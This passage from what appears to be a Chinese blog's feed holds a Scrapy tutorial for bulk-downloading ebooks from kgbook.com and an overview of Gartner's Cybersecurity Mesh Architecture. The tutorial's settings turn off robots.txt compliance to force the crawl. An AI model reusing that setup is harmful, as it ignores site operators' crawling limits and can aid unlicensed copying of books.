Engine(引擎)，由引擎交给Spider来处理，</li><li>Spider（爬虫）：它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给引擎，再次进入Scheduler(调度器).</li><li>Item Pipeline(管道)：它负责处理Spider中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方。</li><li>Downloader Middlewares（下载中间件）：可以当作是一个可以自定义扩展下载功能的组件。</li><li>Spider Middlewares（Spider中间件）：可以理解为是一个可以自定扩展和操作引擎和Spider中间通信的功能组件（比如进入Spider的Responses;和从Spider出去的Requests）</li></ul><h2 id="二、Scrapy实战"><a href="#二、Scrapy实战" class="headerlink" title="二、Scrapy实战"></a>二、Scrapy实战</h2><p>虽然用python写一个爬虫也不是很费事，但是有了Scrapy以后让你实现爬虫更简单，更加通用，现在我们还是以《Python爬虫获取电子书资源实战》中的例子，爬取目标网站kgbook.com。也可以对比看一下通过Scrapy爬虫框架实现相同的功能有多么的方便。</p><h3 id="1、Scrapy安装"><a href="#1、Scrapy安装" class="headerlink" title="1、Scrapy安装"></a>1、Scrapy安装</h3><p>首先通过 pip 安装 Scrapy 框架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Scrapy</span><br></pre></td></tr></table></figure><h3 id="2、创建Scrapy项目工程"><a href="#2、创建Scrapy项目工程" class="headerlink" title="2、创建Scrapy项目工程"></a>2、创建Scrapy项目工程</h3><p>创建getbooks的项目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject getbooks</span><br></pre></td></tr></table></figure><p>创建一个getkgbook的爬虫，目标网站kgbook.com</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider getkgbook kgbook.com</span><br></pre></td></tr></table></figure><p>项目的结构如下图所示</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/2-scrapy%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="Scrapy项目目录结构"></p><h3 id="3、实现Scrapy的爬虫代码"><a href="#3、实现Scrapy的爬虫代码" class="headerlink" title="3、实现Scrapy的爬虫代码"></a>3、实现Scrapy的爬虫代码</h3><h4 id="爬数据"><a href="#爬数据" class="headerlink" title="爬数据"></a>爬数据</h4><p>主要的爬虫逻辑实现代码都在getkgbook.py中，在这里实现目录的爬取、翻页、进入到详情页，并解析详情页的数据。<br>getkgbook.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> getbooks.items <span class="keyword">import</span> KgbookItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetkgbookSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">"getkgbook"</span>  <span class="comment">#爬虫的名称</span></span><br><span class="line">    allowed_domains = [<span class="string">"kgbook.com"</span>]   <span class="comment">#爬取的网站</span></span><br><span class="line">    start_urls = [<span class="string">"https://kgbook.com"</span>]  <span class="comment">#爬取的首页</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        categorys = response.xpath(<span class="string">'//div[@id="category"]/div/ul/li/a'</span>)</span><br><span class="line">        <span class="keyword">for</span> category <span class="keyword">in</span> categorys:</span><br><span class="line">            category_url = category.xpath(<span class="string">'./@href'</span>).extract_first()</span><br><span class="line">            url=response.urljoin(category_url)</span><br><span class="line">            <span class="comment">#爬取进入到目录页</span></span><br><span class="line">            <span class="keyword">yield</span> response.follow(url, self.parse_booklist) </span><br><span class="line"></span><br><span class="line">    <span class="comment">#解析目录页</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_booklist</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        book_list_select=response.css(<span class="string">'.channel-item h3.list-title a'</span>)</span><br><span class="line">        <span class="comment">#获取书籍列表</span></span><br><span class="line">        <span class="keyword">for</span> book_info_select <span class="keyword">in</span> book_list_select:</span><br><span class="line">            book_name=book_info_select.css(<span class="string">'::text'</span>).extract_first()</span><br><span class="line">            book_detail_url=book_info_select.css(<span class="string">'::attr(href)'</span>).extract_first()</span><br><span class="line">            book_detail_url=response.urljoin(book_detail_url)</span><br><span class="line">            print(book_name,book_detail_url)</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=book_detail_url, callback=self.pase_bookdetail)</span><br><span class="line">        <span class="comment">#翻页</span></span><br><span class="line">        nextpage_url = response.xpath(<span class="string">'//div[@class="pagenavi"]/a[contains(text(), "下一页")]/@href'</span>).extract_first()</span><br><span class="line">        <span class="keyword">if</span> nextpage_url:</span><br><span class="line">            <span class="keyword">yield</span> response.follow(nextpage_url, self.parse_booklist)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#解析详情页</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pase_bookdetail</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        navegate=response.xpath(<span class="string">'//nav[@id="location"]/a'</span>)</span><br><span class="line">        <span class="keyword">if</span> len(navegate)&gt;<span class="number">1</span>:</span><br><span class="line">            book_category=navegate[<span class="number">1</span>].xpath(<span class="string">'./text()'</span>).extract_first()</span><br><span class="line">        book_name=response.css(<span class="string">'.news_title::text'</span>).extract_first()</span><br><span class="line">        book_author=response.xpath(<span class="string">'//div[@id="news_details"]/ul/li[contains(text(),"作者")]/text()'</span>).extract_first()</span><br><span class="line">        pattern=re.compile(<span class="string">'mobi|epub|azw3|pdf'</span>,re.I) <span class="comment">#解析书籍的类型</span></span><br><span class="line">        book_download_urls=response.xpath(<span class="string">'//div[@id="introduction"]/a[@class="button"]'</span>)</span><br><span class="line">        <span class="keyword">for</span> book_download_urlinfo <span class="keyword">in</span> book_download_urls:</span><br><span class="line">            book_type=book_download_urlinfo.re(pattern)</span><br><span class="line">            <span class="keyword">if</span> book_type:</span><br><span class="line">                book_download_url=book_download_urlinfo.xpath(<span class="string">'./@href'</span>).extract_first()</span><br><span class="line">                <span class="comment">#获取要下载的书籍的名称、作者、要保存的路径、下载地址</span></span><br><span class="line">                item=KgbookItem()</span><br><span class="line">                item[<span class="string">'book_name'</span>]=book_name</span><br><span class="line">                item[<span class="string">'book_author'</span>]=book_author</span><br><span class="line">                item[<span class="string">'book_file'</span>]=os.path.join(book_category,book_name+<span class="string">"."</span>+str(book_type[<span class="number">0</span>]).lower())</span><br><span class="line">                item[<span class="string">'book_url'</span>]=book_download_url</span><br><span class="line">                print(book_name,book_author,book_download_url,item[<span class="string">'book_file'</span>])</span><br><span class="line">                <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p>在这里我们通过xpath解析器和css解析器来解析获取网页中的有用的信息。如提取a 标签的href的信息 ，提取书籍的名称、作者、下载链接等信息。</p><h4 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h4><p>item.py<br>在item.py中定义了KgbookItem类，Item 定义结构化数据字段，用来保存爬取到的数据，有点像 Python 中的 dict，但是提供了一些额外的保护减少错误。在这里定义了book_name、book_author、book_file、book_url这些信息都会通过爬虫提取后保存用来输出到文件或数据库等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KgbookItem</span><span class="params">(scrapy.Item)</span>:</span></span><br><span class="line">    book_name=scrapy.Field()</span><br><span class="line">    book_author=scrapy.Field()</span><br><span class="line">    book_file=scrapy.Field()</span><br><span class="line">    book_url=scrapy.Field()</span><br></pre></td></tr></table></figure><h4 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h4><p>通过pipelines定义文件下载的管道类<br>pipelines.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> item, Request</span><br><span class="line"><span class="keyword">from</span> scrapy.pipelines.files <span class="keyword">import</span> FilesPipeline</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KgBookFilePipeline</span><span class="params">(FilesPipeline)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_media_requests</span><span class="params">(self,item,info)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> Request(item[<span class="string">'book_url'</span>],meta=&#123;<span class="string">'book_file'</span>:item[<span class="string">'book_file'</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">file_path</span><span class="params">(self, request, response=None, info=None)</span>:</span></span><br><span class="line">        file_name=request.meta.get(<span class="string">'book_file'</span>)</span><br><span class="line">        <span class="keyword">return</span> file_name</span><br></pre></td></tr></table></figure><p>这里实际上只做两件事，一是get_media_requests下载文件，二是组织文件要保存的路径。会通过相应的下载中间件将文件下载并保存在需要保存的目录。这里我们规划的保存目录是书籍目录\书名.类型。<br>还需要在settings.py中定义下载后保存的路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保存书籍的路径</span></span><br><span class="line">FILES_STORE=<span class="string">'./books'</span></span><br><span class="line"><span class="comment"># 定义自定义下载的管道</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">"getbooks.pipelines.KgBookFilePipeline"</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加入以下定义，强制爬取、下载，并忽略301,302重定向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">MEDIA_ALLOW_REDIRECTS = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">HTTPERROR_ALLOWED_CODES = [<span class="number">301</span>,<span class="number">302</span>]</span><br></pre></td></tr></table></figure><p>至此，就通过Scrapy爬虫框架实现了一个爬虫。<br>运行效果<br>执行 <code>scrapy crawl getkgbook -o books.json</code><br>可以看到控制台打印出来的日志，爬虫开始默默的勤勤恳恳的爬取了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/3-scrapy%E7%88%AC%E5%8F%96%E6%97%A5%E5%BF%97.png" alt="爬取日志"></p><p>爬取的结果保存到了books.json中<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/4-books.json.png" alt="books.json"></p><p>要下载的书籍也保存到了books下相应的目录下了<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/5-%E4%BF%9D%E5%AD%98%E7%9A%84%E6%96%87%E4%BB%B6.png" alt="保存的文件"></p><h2 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a>三、注意事项</h2><p>有可能在文件下载的时候并没有把文件下载下来，原因是文件下载路径有重定向。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.core.engine</span>] DEBUG: Crawled (<span class="number">301</span>) &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">471</span>&amp;pathid=<span class="number">0</span>&gt; (referer: None)</span><br><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.pipelines.files</span>] WARNING: File (code: <span class="number">301</span>): Error downloading file from &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">471</span>&amp;pathid=<span class="number">0</span>&gt; referred <span class="keyword">in</span> &lt;None&gt;</span><br><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.core.engine</span>] DEBUG: Crawled (<span class="number">301</span>) &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">4742</span>&amp;pathid=<span class="number">0</span>&gt; (referer: None)</span><br><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.pipelines.files</span>] WARNING: File (code: <span class="number">301</span>): Error downloading file from &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">4742</span>&amp;pathid=<span class="number">0</span>&gt; referred <span class="keyword">in</span> &lt;None&gt;</span><br></pre></td></tr></table></figure><p>需要在settings.py中加入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MEDIA_ALLOW_REDIRECTS = <span class="literal">True</span>  <span class="comment">#直接下载</span></span><br><span class="line"></span><br><span class="line">HTTPERROR_ALLOWED_CODES = [<span class="number">301</span>,<span class="number">302</span>]  <span class="comment">#忽略重定向的报错信息</span></span><br></pre></td></tr></table></figure><p>现在我们通过一个Scrapy爬虫框架实例实现了网站的爬取，重代码量上看比python直接写少了很多，通用性也更强了。通过管道不仅仅可以将数据保持至json还可以保存到Excel、数据库等。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Python实现爬虫是很容易的，一般来说就是获取目标网站的页面，对目标页面的分析、解析、识别，提取有用的信息，然后该入库的入库，该下载的下载。以前写过一篇文章&lt;a href=&quot;http://xiejava.ishareread.com/posts/eab21fe5/&quot; ta
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网络安全之认识网络安全网格架构（CSMA）</title>
    <link href="https://xiejava.gitee.io/posts/d236743/"/>
    <id>https://xiejava.gitee.io/posts/d236743/</id>
    <published>2023-09-11T08:18:40.000Z</published>
    <updated>2023-09-11T08:33:33.984Z</updated>
    
    <content type="html"><![CDATA[<p>“网络安全网格（CyberSecurity Mesh）”是 Gartner 提出的网络安全技术发展新趋势，近两年连续入选其年度重要战略技术趋势研究报告，成为当前网络安全领域流行的热词，受到网络安全从业者的高度关注。</p><h2 id="一、概念产生的背景"><a href="#一、概念产生的背景" class="headerlink" title="一、概念产生的背景"></a>一、概念产生的背景</h2><p>如今，由于现在平均每个企业在自己的网络上部署了多达45个安全解决方案，使得任何形式的集中管理都几乎无法实现。更糟糕的是，检测和响应网络事件需要在其中的19个工具之间进行协调，导致每次设备升级时都需要不断管理和重新配置。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230911/1-CSAM%E6%A6%82%E5%BF%B5.png" alt="CSMA概念背景"></p><p>仅仅依靠连接不同安全技术的变通方法是不够的，企业需要一个全面覆盖、深度集成和动态协同的“网络安全网格平台”，提供集中管理和可见性，支持在一个庞大的解决方案生态系统中协同运行，自动适应网络中的动态变化。</p><p>因此有了网络安全网格这个概念。</p><p>Gartner 发布的《2021 年重要战略技术趋势》（Top Strategic Technology Trends for 2021）中描述了网络安全网格的概念：“网络安全网格是一种分布式架构方法，能够实现可扩展、灵活和可靠的网络安全控制。现在许多资产存在于传统安全边界之外，网络安全网格本质上允许围绕人或事物的身份定义安全边界。通过集中策略编排和分布策略执行来实现更加模块化、更加快速响应的安全防护。”</p><p>在 Gartner 发布的《2022 年重要战略技术趋势 》（Top Strategic Technology Trends for 2022）中对网络安全网格概念有了进一步的说明：“数字业务资产分布在云和数据中心，基于边界的传统、分散的安全方法使组织容易遭受攻击。网络安全网格架构提供一种基于身份的可组合安全方法，以创建可扩展和可互操作的服务。通用的集成结构可以保护任务组织的任何资产，对于使用这样的一体化安全工具的组织来说，可将单项安全事件的财务影响平均减少 90%。”</p><p>从上述 Gartner 报告的描述中可以看出，网络安全网格是一种安全架构方法或者策略，而不是一种定义明确的架构或标准化的技术方法，更不是某种产品，其目的是找到能够应对不断发展的业务系统以及网络环境演变所带来的安全挑战的新方法，提供比传统物理边界防护更强大、更灵活和可扩展的安全能力。通过连接、集成和协同管理各种网络安全控制系统、服务和数据来提供综合安全保护的框架。它致力于构建一个灵活、弹性和动态的安全环境，以适应日益复杂和多样化的网络安全威胁。</p><h2 id="二、架构与实现"><a href="#二、架构与实现" class="headerlink" title="二、架构与实现"></a>二、架构与实现</h2><p>Gartner 提出了网络安全网格的具体实现框架，即网络安全网格架构（CyberSecurity Mesh Architecture，CSMA）。这是一种分布式安全服务的协作框架，提供安全分析与情报、统一策略管理、整合操控界面和分布式身份结构等 4个安全基础设施使不同的安全工具能够基于该基础设施协同工作并实现统一的配置和管理，提高安全工具的可组合性、可扩展性和互操作性，解决多种安全工具在各个孤立体系中运行时所带来的问题，实现各种安全能力的有机聚合，适应业务发展需要并达到“力量倍增”的效果。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230911/3-CSMA%E6%9E%B6%E6%9E%842.png" alt="CSMA架构图"><br>网络安全网格架构的组成如上图图所示，4 个基础支撑层之间以及与其他安全系统之间的关系如下：</p><ol><li>安全分析与情报层。可与来自第三方的安全工具开展联合协同检测，基于丰富的威胁分析手段，结合威胁情报，利用机器学习等技术形成更加准确一致的威胁分析结果。</li><li>统一策略管理层。主要包括安全策略编排和安全态势管理，将集中的策略转换为各个安全工具的本地配置策略，实现分布式执行，并支持动态策略管理服务。</li><li>整合操控界面层。实现安全数据可视化，提供安全系统复合视图，主要包括统一的控制面板、告警、审查、指导手册和报告等，使安全团队能够更快速、更有效地响应安全事件。</li><li>身份架构层。主要提供目录服务、自适应访问以及去中心化的身份管理、身份验证和授权管理等功能，支撑构建适合用户需求的零信任网络架构。</li></ol><p>网络安全网格是在物理网络之上构建的逻辑层，网络安全架构的应用视图如下图所示，直观展示了在逻辑层中通过对各种安全能力的编排、执行，使得各种安全工具基于 4 个安全基础层实现互操作，提供统一的安全管控和可见性，而不是在孤岛中运行每个安全工具，从而构建一个能在庞大的安全生态中协同运行，且自动适应网络环境演化的安全平台。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230911/4-CSMA%E6%9E%B6%E6%9E%843.png" alt="CSMA应用视图"></p><h2 id="三、主要特点"><a href="#三、主要特点" class="headerlink" title="三、主要特点"></a>三、主要特点</h2><p>网络安全网格主要涉及设计和建设 IT 安全基础设施，采用“水平”分布式方式将各种安全能力集成到网络中，而不是采用传统的“自上而下”、各种安全设备“一应俱全”的集成方式，致力于构建一个能在庞大的安全生态系统中协同运行，且自动适应网络环境演化的全面覆盖、统一管控、动态协同和快速响应的安全平台。</p><ul><li><p>通用集成框架。网络安全网格提供一种通用的集成框架和方法，实现类似“乐高”化思维的灵活、可组合、可扩展的安全架构。通过标准化工具支持可互操作的各种安全服务编排和协同，从而实现广泛分布的不同安全服务的高效集成，建立起合作的安全生态系统来保护处于本地、数据中心和云中的数字资产，并基于数据分析、情报支持和策略管理等能力的聚合形成更加强大的整体安全防御和响应处置能力。</p></li><li><p>分布式网络架构。网络安全网格利用了“网格”的去中心化、对等协作、结构灵活、连接可靠、扩展性强等优势，不再侧重于围绕所有设备或节点构建“单一”边界，而是围绕每个接入点创建更小的、单独的边界 [5-6]。通过建立与接入点同样多的安全边界，保证物理位置广泛分布的用户能随时随地安全接入，符合零信任网络中的“微分段”要求，使得网络犯罪分子和黑客更难利用整个网络。同时，网络中主客体之间在逻辑上都是点对点直连关系，无须关注具体的物理网络部署，能够简化安全配置且能自动适应网络动态变化。</p></li><li><p>集中管理与分散执行。与传统的网关集中访问控制不同，网络安全网格采用了集中的策略编排和权限管理，基于策略分布式的执行，将网络安全控制能力分布到网络的更多地方，使安全措施更接近需要保护的资产，一方面，有利于消除安全管控盲点，缓解传统集中安全控制存在的性能处理瓶颈，适应用户终端和组织业务分散化发展需要；另一方面，有利于实现全局的安全威胁分析，形成更加一致的安全态势，从而实现更加精准的安全管控和更加快速的响应处置。</p></li><li><p>围绕身份定义安全边界。在当前网络协议中，因缺失身份要素带来了很多安全问题，物理 IP 地址与人和终端的关联性越来越弱，导致基于地址、流量、日志的安全检测和威胁分析技术难以实现针对人的威胁研判；基于网络协议字段特征检测的传统边界访问控制技术，同样使得基于身份的授权访问成为天方夜谭。由于网络威胁本质上是人带来的威胁，因此难以实现精准高效的安全威胁处置。网络安全网格延续了零信任网络的思想，用身份定义网络边界，让身份成为威胁研判与安全管控的基础。</p></li></ul><h2 id="四、应用场景"><a href="#四、应用场景" class="headerlink" title="四、应用场景"></a>四、应用场景</h2><p><strong>网络安全网格的应用场景包括：</strong></p><ol><li>云安全：网络安全网格可用于跨多个云环境提供综合的安全管理和保护，确保云服务的安全性和合规性。</li><li>边缘安全：网络安全网格可以应用于边缘计算环境，以提供安全的边缘设备管理、数据保护和边缘网络保护。</li><li>供应链安全：通过网络安全网格，可以实现供应链中各个环节的安全协同，共享安全信息，降低供应链中的安全风险。</li><li>物联网安全：网络安全网格可以为物联网设备和系统提供统一的安全管理和保护，保障物联网环境的安全性和可信度。</li></ol><h2 id="五、价值和优势"><a href="#五、价值和优势" class="headerlink" title="五、价值和优势"></a>五、价值和优势</h2><p><strong>网络安全网格的主要价值包括：</strong></p><ol><li>综合安全保护：网络安全网格可以集成多个安全控制系统和服务，提供全面的安全保护，从网络边界到终端设备，覆盖各个层面和环节的安全需求。</li><li>动态适应能力：网络安全网格具备弹性和动态适应的特性，能够快速识别和响应新的威胁，并自动调整安全策略和控制措施以提供即时和有效的保护。</li><li>协同合作：网络安全网格促进了不同安全系统和服务之间的协同合作和信息共享。通过共享威胁情报和安全事件信息，提高整体的安全防御能力，并加强各方之间的合作与配合。</li><li>可扩展性和灵活性：网络安全网格具备高度的可扩展性，可以根据实际需求快速部署和调整安全控制系统，适用于各种规模和复杂度的网络环境。</li></ol><p><strong>网络安全网格与传统网络安全方法在以下几个方面存在区别：</strong></p><ol><li>集成性：传统网络安全方法通常是独立而孤立的解决方案，每个安全设备或系统都有自己的管理界面和策略。而网络安全网格强调集成不同的安全控制系统和服务，通过连接和协同工作来提供综合的安全保护，实现整体的安全扩展性和一致性。</li><li>动态适应性：传统网络安全方法通常是静态的，在部署后很少变动，而网络安全网格具备弹性和动态适应的特性。它可以根据实际需求自动调整安全策略和控制措施，灵活应对不断变化的威胁环境。</li><li>协同合作：传统网络安全方法主要依赖于各个安全设备或系统的独立工作，缺乏跨系统的协同合作。而网络安全网格通过实现安全控制系统和服务之间的协同和信息共享，提高整体的安全防御能力，并加强各方之间的合作与配合。</li><li>统一视图和管理：传统网络安全方法通常需要使用多个不同的管理界面来管理各个安全设备或系统，使得安全管理变得复杂而繁琐。而网络安全网格提供统一的视图和管理平台，使得管理员可以更便捷地管理和监控整个安全环境，提高管理效率和反应速度。</li><li>灵活性和可扩展性：传统网络安全方法在部署和扩展时通常需要考虑设备间的兼容性和差异性。而网络安全网格具备高度的灵活性和可扩展性，可以根据实际需求灵活部署和调整安全控制系统，适用于各种规模和复杂度的网络环境。</li></ol><p><strong>网络安全网格架构的优势主要体现以下几个方面：</strong></p><ol><li>实现更加可靠的安全防御。网络安全网格摒弃了传统的边界防护思想，不仅是围绕网络数据中心、服务中心构建“边界”，还围绕每个接入点创建更小的、独立的边界，并由集中的控制中心进行统一管理，从而将安全控制扩展到广泛分布的资产，在提高威胁应对能力的同时，增强了安全系统的可扩展性、灵活性和弹性。</li><li>应对复杂环境下的安全需求。通过网络安全策略集中编排但分散执行的方法，在统一的安全策略控制下，提供一种灵活且易于扩展的安全基础架构，可为混合云和多云等复杂环境中的资产保护提供所需的安全能力。</li><li>实现更加高效的威胁处置。通过安全工具集成，加强了安全数据采集和预测分析之间的协作，可以更加快速、准确地获取安全态势，及时发现并应对安全威胁，可大幅度增强对违规和攻击事件的响应处置能力。</li><li>构建更加开放的安全架构。提供了一种可编排的通用集成框架和方法，支持各类安全服务之间的协同工作，用户可自主选择当前和新兴的安全技术与标准，面向云原生和应用程序接口（Application Programming Interface，API） 插 件的环境更加易于集成，便于定制与扩展，能有效弥补不同供应商安全方案之间的能力差距。</li><li>降低建设维护的成本与难度。用户可以有效减少管理一组庞大的孤立安全解决方案的开销，同时，安全能力部署和维护所需的时间更少、成本更低，易于与用户已建设的身份识别与访问管理（Identity and Access Management，IAM）、安全信息和事件管理（Security Information and Event Management，SIEM）、 安 全运营中心（Security Operations Center，SOC）、态势感知等安全系统共存，也方便对接已建设的专线、软件定义广域网（Software-Defined Wide Area Network，SD-WAN）等网络服务。</li></ol><hr><p> 博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;“网络安全网格（CyberSecurity Mesh）”是 Gartner 提出的网络安全技术发展新趋势，近两年连续入选其年度重要战略技术趋势研究报告，成为当前网络安全领域流行的热词，受到网络安全从业者的高度关注。&lt;/p&gt;
&lt;h2 id=&quot;一、概念产生的背景&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python进行数据相关性分析实战</title>
    <link href="https://xiejava.gitee.io/posts/cd0f90f9/"/>
    <id>https://xiejava.gitee.io/posts/cd0f90f9/</id>
    <published>2023-08-31T10:10:01.000Z</published>
    <updated>2023-08-31T10:21:21.736Z</updated>
    
